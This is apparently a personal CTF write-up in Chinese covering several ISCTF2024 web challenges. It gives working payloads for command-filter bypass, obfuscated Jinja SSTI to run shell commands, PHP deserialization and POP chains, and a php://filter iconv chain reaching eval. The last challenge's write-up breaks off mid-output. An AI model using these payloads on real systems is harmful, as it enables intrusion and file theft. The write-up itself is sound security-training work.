# [个人队伍] ISCTF2024的Writeup

> **2025年12月8日18:09 ~ 2029年10月26日23:09**
>
> **比赛地址：https://gz.imxbt.cn/games/16/challenges**
>
> **复现地址：https://gz.imxbt.cn/games/16/challenges**

> 个人赛
>
> # ISCTF2024复现
>
> **653**支队伍已报名
>
> 开始时间
>
> 2025年12月8日晚上6点09分
>
> 结束时间
>
> 2029年10月26日晚上11点09分
>
> 因 **ezpython和在逆向尽头咏唱密码的少女** 两个题目均为0解，且出题人选择不公布内容，故将不会在复现赛事中出现这两题



# All

## Web

### 1z_php

#### 题目信息

> ## 1z_php250 pts
>
> 题目难度：**签到**
>
> 题目描述：一句话木马都有了，还要什么自行车
>
> 出题人：J1ngHong
>
> 学校：杭州师范大学

#### 解题过程

##### 查看题目

```php
<?php
highlight_file('index.php');

#一句话木马，神神又奇奇

if(isset($_POST['J'])){
    $call=$_POST['J'];
    $dangerous_commands = ['cat', 'tac', 'head', 'nl', 'more', 'less', 'tail', 'vi', 'sed', 'od'];
    foreach ($dangerous_commands as $command) {
        if (preg_match("/$command/i", $call)) {
            die("这些个危险函数可不兴使啊");
        }
    }
    system($call);
}
?>
```

**分析**

- **sort**

##### 编写payload

```shell
sort /f*
```

##### 发起攻击

```shell
POST J=sort /f*
```

```shell
ISCTF{fb2d81a2-75aa-466b-b58e-657f7617835f}
```

#### 题目答案

##### 核心payload

```shell
POST J=sort /f*
```

##### 获得结果

```shell
ISCTF{fb2d81a2-75aa-466b-b58e-657f7617835f}
```



### 25时晓山瑞希生日会

#### 题目信息

> ## 25时晓山瑞希生日会252 pts
>
> 题目难度：**签到**
>
> 题目描述：瑞希是神山高校一年级生，《25时，在Nightcord。》的MV师。马上要到生日了。生日会邀请了很多人来参加。
> 此题在9.15就出好了，谁料会发生如此变故，sega我恨你;w;
>
> 出题人：oSthing
>
> 学校：浙江工商职业技术学院

#### 解题过程

##### 查看题目

```shell
从某客户端来
从本地地址来
从某时间戳来
```

##### 编写payload

```shell
User-Agent: Project Sekai
X-Forwarded-For: 127.0.0.1
Data: Tue, 27 Aug 2024 05:00:00 GMT
```

##### 发起攻击

```shell
User-Agent: Project Sekai
X-Forwarded-For: 127.0.0.1
Data: Tue, 27 Aug 2024 05:00:00 GMT
```

```shell
—— 25时主题咖啡厅×晓山瑞希生日会 bad end——
很高兴你能按时过来，但是非常遗憾地通知大家，本次原定于8月27日的杭州场25时主题咖啡厅×晓山瑞希生日会最终决定取消，在此向大家深表歉意...

不过我们还是为你准备了一些东西: ISCTF{b80f372d-89e6-44e2-9174-682a42c70ed1}
```

#### 题目答案

##### 核心payload

```shell
User-Agent: Project Sekai
X-Forwarded-For: 127.0.0.1
Data: Tue, 27 Aug 2024 05:00:00 GMT
```

##### 获得结果

```shell
ISCTF{b80f372d-89e6-44e2-9174-682a42c70ed1}
```



### ezSSTI

#### 题目信息

> ## ezSSTI256 pts
>
> 题目难度：**简单**
>
> 题目描述：python ssti注入
>
> 出题人：fpclose
>
> 学校：大理大学

#### 解题过程

##### 查看题目

```shell
{{1+1}}
```

```shell
You entered: 2
```

```shell
{{().__class__.__base__.__subclasses__()}}
```

```shell
You entered: waf!
```

**分析**

- **存在SSTI漏洞注入**
- **存在Waf黑名单拦截**

##### 模糊测试

利用自研工具WebFuzz(https://github.com/BProbie/WebFuzz)模糊测试一下Waf

```shell
WebFuzz -u http://challenge.imxbt.cn:30820/ -dt {'user_input':'{{().__class__.__bases__[0].__subclasses__()}}'} -waf waf! -tr 100
```

```shell
Thanks For Using WebFuzz-v1.1.0 (https://github.com/BProbie/WebFuzz)
Uri: http://challenge.imxbt.cn:30820/
Type: POST
Data: {'user_input': '{{().__class__.__bases__[0].__subclasses__()}}'}
Waf: ['waf!']
Delay: 0
Thread: 100
The Script Start At The Time Of 2026-05-12 17:16:36

[#########################] 903/903 (The Script End At The Time Of 2026-05-12 17:17:05)

The Result of WebFuzz: ['_', '[']
```

**分析**

- 我们可以用**【("%c"%95)*2】**来替代**【__】**
- 我们可以用**【|attr("getitem")(0)】**来替代**【[0]】**
- 我们用**【{% print %}】**来执行

##### 编写payload

```shell
{% print (cycler.next|attr(("%c"%95)*2+'globals'+("%c"%95)*2)|attr(("%c"%95)*2+'getitem'+("%c"%95)*2) (("%c"%95)*2+'builtins'+("%c"%95)*2)|attr(("%c"%95)*2+'getitem'+("%c"%95)*2)(("%c"%95)*2+'import'+ ("%c"%95)*2))('os').popen('cat /f*').read() %}
```

##### 发起攻击

```shell
{% print (cycler.next|attr(("%c"%95)*2+'globals'+("%c"%95)*2)|attr(("%c"%95)*2+'getitem'+("%c"%95)*2) (("%c"%95)*2+'builtins'+("%c"%95)*2)|attr(("%c"%95)*2+'getitem'+("%c"%95)*2)(("%c"%95)*2+'import'+ ("%c"%95)*2))('os').popen('cat /f*').read() %}
```

```shell
You entered: ISCTF{d70c7690-e492-47a1-a964-9f98f77ec477}
```

#### 题目答案

##### 核心payload

```shell
{% print (cycler.next|attr(("%c"%95)*2+'globals'+("%c"%95)*2)|attr(("%c"%95)*2+'getitem'+("%c"%95)*2) (("%c"%95)*2+'builtins'+("%c"%95)*2)|attr(("%c"%95)*2+'getitem'+("%c"%95)*2)(("%c"%95)*2+'import'+ ("%c"%95)*2))('os').popen('cat /f*').read() %}
```

##### 获得答案

```shell
ISCTF{d70c7690-e492-47a1-a964-9f98f77ec477}
```



### ezrce

#### 题目信息

> ## ezrce252 pts
>
> 题目难度：**简单**
>
> 题目描述：命令执行
>
> 出题人：Doramer
>
> 学校：成都东软学院

#### 解题过程

##### 查看题目

```php
<?php

error_reporting(0);

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];

    if (preg_match("/flag|cat|ls|echo|php|bash|sh|more| |less|head|tail|[\|\&\>\<]|eval|system|exec|popen|shell_exec/i", $cmd)) {
        die("Blocked by security filter!");
    } else {
        eval($cmd);
    }
} else {
    highlight_file(__FILE__);
}
?>
```

**分析**

- **可以用内置函数**

##### 构造payload

```shell
readfile('/fla'.'g');
```

##### 发起攻击

```shell
?cmd=readfile('/fla'.'g');
```

```shell
ISCTF{2e088ce0-5b86-471a-b00c-2e03da8abf49}
```

#### 题目答案

##### 核心payload

```shell
?cmd=readfile('/fla'.'g');
```

##### 获得答案

```shell
ISCTF{2e088ce0-5b86-471a-b00c-2e03da8abf49}
```



### ezserialize

#### 题目信息

> ## ezserialize263 pts
>
> 题目难度：**简单**
>
> 题目描述：一个简单的反序列化
>
> 出题人：Doramer
>
> 学校：成都东软学院

#### 解题过程

##### 查看题目

```php
<?php
error_reporting(0);

class Flag {
    private $flag;

    public function __construct() {
        $this->flag = file_get_contents('/flag');
    }

    public function getFlag() {
        return $this->flag;
    }

    public function __toString() {
        return "You can't directly access the flag!";
    }
}

class User {
    public $username;
    public $isAdmin = false;

    public function __construct($username) {
        $this->username = $username;
    }

    public function __wakeup() {
        if ($this->isAdmin) {
            echo "Welcome, admin! Here's your flag: " . (new Flag())->getFlag();
        } else {
            echo "Hello, " . htmlspecialchars($this->username) . "!";
        }
    }
}

if (isset($_GET['data'])) {
    $data = $_GET['data'];

    $object = unserialize($data);
    if ($object instanceof User) {
        echo $object;
    } else {
        echo "Invalid object!";
    }
} else {
    highlight_file(__FILE__);
}
?>
```

**分析**

- PHP序列化漏洞

##### 编写脚本

```php
<?php
error_reporting(0);

class Flag {
    private $flag;

    public function __construct() {
        $this->flag = file_get_contents('/flag');
    }

    public function getFlag() {
        return $this->flag;
    }

    public function __toString() {
        return "You can't directly access the flag!";
    }
}

class User {
    public $username;
    public $isAdmin = true;

    public function __construct($username) {
        $this->username = $username;
    }

    public function __wakeup() {
        if ($this->isAdmin) {
            echo "Welcome, admin! Here's your flag: " . (new Flag())->getFlag();
        } else {
            echo "Hello, " . htmlspecialchars($this->username) . "!";
        }
    }
}

echo urldecode(serialize(new User("admin")));
```

```shell
O:4:"User":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:1;}
```

##### 发起攻击

```shell
?data=O:4:"User":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:1;}
```

```shell
Welcome, admin! Here's your flag: ISCTF{c9075a08-9222-4d0f-a64e-11f0b78e7dec}
```

#### 题目答案

##### 核心脚本

```php
<?php
error_reporting(0);

class Flag {
    private $flag;

    public function __construct() {
        $this->flag = file_get_contents('/flag');
    }

    public function getFlag() {
        return $this->flag;
    }

    public function __toString() {
        return "You can't directly access the flag!";
    }
}

class User {
    public $username;
    public $isAdmin = true;

    public function __construct($username) {
        $this->username = $username;
    }

    public function __wakeup() {
        if ($this->isAdmin) {
            echo "Welcome, admin! Here's your flag: " . (new Flag())->getFlag();
        } else {
            echo "Hello, " . htmlspecialchars($this->username) . "!";
        }
    }
}

echo urldecode(serialize(new User("admin")));
```

##### 获得答案

```shell
ISCTF{c9075a08-9222-4d0f-a64e-11f0b78e7dec}
```



### ⭐千年樱

#### 题目信息

> ## 千年樱525 pts
>
> 题目难度：**中等**
>
> 题目描述：一个古老的童话故事
>
> 出题人：guoql
>
> 学校：河南师范大学

#### 解题过程

##### 查看题目

```php
<?php
include "dir.php";
highlight_file(__FILE__);

echo "proof of work<br>";

if($_COOKIE['from'] === "ISCTF"){
    echo $dir1;
}
else{
    die('what? so where are you from?');
}

// <!-- do you want to learn more?  goto story.txt -->
?>
```

```shell
Cookie: from=ISCTF
```

```shell
/get_contents_qwerghjkl.php
```

```php
<!DOCTYPE html>
<html>
<head>
    <title>read! read! read!</title>
</head>
<body style="background: '/static/bg1.png' ">
    <?php
    include "dir.php";
    highlight_file(__FILE__);

    if(file_get_contents($_POST['name']) === 'ISCTF'){
        echo $dir2;
    }
    else{
        die("Wrong!");
    }


    ?>
</body>
</html>
Warning: file_get_contents(): Filename cannot be empty in /var/www/html/get_contents_qwerghjkl.php on line 11
Wrong!
```

```shell
POST name=data://text/plain;base64,SVNDVEY=
```

```shell
/well_down_mlpnkobji.php
```

```php
<!DOCTYPE html>
<html>
<head>
    <title>read! read! read! we need read!!!</title>
</head>
<body style="background-image: url('/static/bg2.png'); background-size: cover; background-attachment: fixed; ">
    <?php
    include "dir.php";
    highlight_file(__FILE__);

    function waf($str){
        if(preg_match("/http|php|file|:|=|\/|\?/i", $str) ){
            die('bad hacker!!!');
        }
    }
    $poc = $_POST['poc'];
    waf($poc);
    $filename = "php://filter/$poc/resource=/var/www/html/badChar.txt";
    $result = file_get_contents($filename);
    if($result === "sakura for ISCTF"){
        echo "yes! master!";
        eval($_POST['cmd']);
    }

    if($_GET['output'] == 114514 && !is_numeric($_GET['output'])){
        var_dump($result);
    }


    ?>
</body>
</html>
```

```shell
?output=114514a
```

```shell
string(2638) "When I finished grad school in computer science I went to art school to study painting. A lot of people seemed surprised that someone interested in computers would also be interested in painting. They seemed to think that hacking and painting were very different kinds of work—that hacking was cold, precise, and methodical, and that painting was the frenzied expression of some primal urge. Both of these images are wrong. Hacking and painting have a lot in common. In fact, of all the different types of people I've known, hackers and painters are among the most alike. What hackers and painters have in common is that they're both makers. Along with composers, architects, and writers, what hackers and painters are trying to do is make good things. They're not doing research per se, though if in the course of trying to make good things they discover some new technique, so much the better. I've never liked the term "computer science." The main reason I don't like it is that there's no such thing. Computer science is a grab bag of tenuously related areas thrown together by an accident of history, like Yugoslavia. At one end you have people who are really mathematicians, but call what they're doing computer science so they can get DARPA grants. In the middle you have people working on something like the natural history of computers—studying the behavior of algorithms for routing data through networks, for example. And then at the other extreme you have the hackers, who are trying to write interesting software, and for whom computers are just a medium of expression, as concrete is for architects or paint for painters. It's as if mathematicians, physicists, and architects all had to be in the same department. Sometimes what the hackers do is called "software engineering," but this term is just as misleading. Good software designers are no more engineers than architects are. The border between architecture and engineering is not sharply defined, but it's there. It falls between what and how: architects decide what to do, and engineers figure out how to do it. What and how should not be kept too separate. You're asking for trouble if you try to decide what to do without understanding how to do it. But hacking can certainly be more than just deciding how to implement some spec. At its best, it's creating the spec— though it turns out the best way to do that is to implement it. Perhaps one day "computer science" will, like Yugoslavia, get broken up into its component parts. That might be a good thing. Especially if it meant independence for my native land, hacking. "
```

##### 编写脚本

```shell
git clone https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT.git
```

```shell
cd PHP_INCLUDE_TO_SHELL_CHAR_DICT
```

```python
file_to_use = "/var/www/html/badChar.txt"

#<?php eval($_GET[1]);?>a
base64_payload = "YzJGcmRYSmhJR1p2Y2lCSlUwTlVSZz09"

# generate some garbage base64
filters = "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.base64-encode|"
# make sure to get rid of any equal signs in both the string we just generated and the rest of the file
filters += "convert.iconv.UTF8.UTF7|"


for c in base64_payload[::-1]:
        filters += open('./res/'+(str(hex(ord(c)))).replace("0x","")).read() + "|"
        # decode and reencode to get rid of everything that isn't valid base64
        filters += "convert.base64-decode|"
        filters += "convert.base64-encode|"
        # get rid of equal signs
        filters += "convert.iconv.UTF8.UTF7|"

filters += "convert.base64-decode"

final_payload = f"php://filter/{filters}/resource={file_to_use}"

with open('test.php','w') as f:
    f.write('<?php echo file_get_contents("'+final_payload+'");?>')
print(final_payload)
```

```shell
python test.py
```

```shell
php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64decode|convert.base64-decode|convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.iconv.ISO6937.EUC-JP-MS|convert.iconv.EUCKR.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CN.ISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/var/www/html/badChar.txt
```

##### 发起攻击

```shell
POST poc=convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64decode|convert.base64-decode|convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.iconv.ISO6937.EUC-JP-MS|convert.iconv.EUCKR.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CN.ISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode&cmd=system('cat flag.php');
```

```shell
ISCTF{...}
```

#### 题目答案

##### 核心脚本

```python
file_to_use = "/var/www/html/badChar.txt"

#<?php eval($_GET[1]);?>a
base64_payload = "YzJGcmRYSmhJR1p2Y2lCSlUwTlVSZz09"

# generate some garbage base64
filters = "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.base64-encode|"
# make sure to get rid of any equal signs in both the string we just generated and the rest of the file
filters += "convert.iconv.UTF8.UTF7|"


for c in base64_payload[::-1]:
        filters += open('./res/'+(str(hex(ord(c)))).replace("0x","")).read() + "|"
        # decode and reencode to get rid of everything that isn't valid base64
        filters += "convert.base64-decode|"
        filters += "convert.base64-encode|"
        # get rid of equal signs
        filters += "convert.iconv.UTF8.UTF7|"

filters += "convert.base64-decode"

final_payload = f"php://filter/{filters}/resource={file_to_use}"

with open('test.php','w') as f:
    f.write('<?php echo file_get_contents("'+final_payload+'");?>')
print(final_payload)
```

##### 获得答案

```shell
ISCTF{...}
```



### 天命人

#### 题目信息

> ## 天命人525 pts
>
> 题目难度：**中等**
>
> 题目描述：又一个不相信天命的，你能逃出去吗？
>
> 出题人：J1ngHong
>
> 学校：杭州师范大学

#### 解题过程

##### 查看题目

```php

<?php
error_reporting(0);

# 帮天命人搜集法宝，重获齐天之姿！
class Wuzhishan{
    public $wu="俺老孙定要踏破这五指山！<br>";
    public $zhi;
    public $shan;

    function __get($j)
    {
        echo "此地阴阳二气略显虚浮，加上刚刚带入的阳气，或可借此遁逃！<br>";
        $yin="s214587387a";
        $yang=$_GET['J'];
        if (md5($yin)==$yang&&md5($yin)==md5($yang)){
            echo "哦？又一个不信天命之人？行了，拿了东西速速离开吧<br>";
            system('cat /flag');
        }
    }
}
class Huoyanjinjing{
    public $huoyan;
    public $jinjing;
    function __get($huo)
    {
        $this->huoyan="火眼能洞察一切邪祟！<br>";
        echo $this->huoyan->jinjing;
    }
    function __invoke()
    {
        $this->jinjing="金睛能看破世间迷惘！<br>";
        echo $this->huoyan->jinjing;
    }
}
class Dinghaishenzhen{
    public $Jindou="一个筋斗能翻十万八千里！<br>";
    public $yun;

    function __toString()
    {
        $f=$this->yun;
        $f();
        return "你真的逃出去了吗？天命人？<br>";
    }
}
class Jingdouyun{
    public $Qishier=72;
    public $bian="看俺老孙七十二变！<br>";

    function __sleep()
    {
        echo "三更敲门，菩提老祖送我筋斗云...<br>";
        echo new Jindouyun();
    }
}
class Tianmingren {
    public $tianming;
    public $ren;
    function __destruct()
    {
        echo "迷途中的羔羊，你相信天命吗？<br>";
        echo $this->tianming;
    }
}
$data = unserialize($_POST['Wukong']);
throw new Exception('开局一根棍，装备全靠打。');
?>
```

**分析**

- POP链
- J我们选择0e绕过
- throw我们先择改s绕过

##### 编写脚本

```php
$key = new Tianmingren();
$key->tianming = new Dinghaishenzhen();
$key->tianming->yun = new Huoyanjinjing();
$key->tianming->yun->huoyan = new Wuzhishan();
echo "\n\n".urldecode(serialize($key))."\n\n";
```

```shell
O:11:"Tianmingren":2:{s:8:"tianming";O:15:"Dinghaishenzhen":2:{s:6:"Jindou";s:40:"一个筋斗能翻十万八千里！<br>";s:3:"yun";O:13:"Huoyanjinjing":2:{s:6:"huoyan";O:9:"Wuzhishan":3:{s:2:"wu";s:40:"俺老孙定要踏破这五指山！<br>";s:3:"zhi";N;s:4:"shan";N;}s:7:"jinjing";N;}}s:3:"ren";N;}
```

**分析**

- 为了绕过**throw new Exception('开局一根棍，装备全靠打。')**我们要把**s:3:"ren";N;**改成**s:0:"ren";N;**

  ```shell
  O:11:"Tianmingren":2:{s:8:"tianming";O:15:"Dinghaishenzhen":2:{s:6:"Jindou";s:40:"一个筋斗能翻十万八千里！<br>";s:3:"yun";O:13:"Huoyanjinjing":2:{s:6:"huoyan";O:9:"Wuzhishan":3:{s:2:"wu";s:40:"俺老孙定要踏破这五指山！<br>";s:3:"zhi";N;s:4:"shan";N;}s:7:"jinjing";N;}}s:0:"ren";N;}
  ```

##### 发起攻击

```shell
GET ?J=0e215962017
POST Wukong=O:11:"Tianmingren":2:{s:8:"tianming";O:15:"Dinghaishenzhen":2:{s:6:"Jindou";s:40:"一个筋斗能翻十万八千里！<br>";s:3:"yun";O:13:"Huoyanjinjing":2:{s:6:"huoyan";O:9:"Wuzhishan":3:{s:2:"wu";s:40:"俺老孙定要踏破这五指山！<br>";s:3:"zhi";N;s:4:"shan";N;}s:7:"jinjing";N;}}s:0:"ren";N;}
```

```shell
迷途中的羔羊，你相信天命吗？
此地阴阳二气略显虚浮，加上刚刚带入的阳气，或可借此遁逃！
